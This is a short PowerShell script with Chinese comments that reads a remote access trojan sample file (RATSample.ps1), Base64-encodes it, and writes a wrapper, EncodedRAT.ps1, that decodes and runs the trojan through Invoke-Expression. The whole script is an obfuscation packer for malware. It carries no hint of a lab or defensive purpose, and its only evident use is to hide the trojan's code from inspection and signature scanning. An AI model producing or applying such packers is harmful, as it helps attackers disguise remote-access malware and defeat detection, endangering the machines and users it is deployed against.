# 读取原始RAT脚本
$originalScript = Get-Content -Path "../../RATSample.ps1" -Raw

# 将脚本转换为Base64编码
$encodedScript = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($originalScript))

# 准备新脚本的内容，该脚本将解码并执行原始脚本
$decodedExecuteScript = @"
`$decodedScript = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('$encodedScript'))
Invoke-Expression `$decodedScript
"@

# 将新脚本内容写入文件
$decodedExecuteScript | Out-File -FilePath "EncodedRAT.ps1"
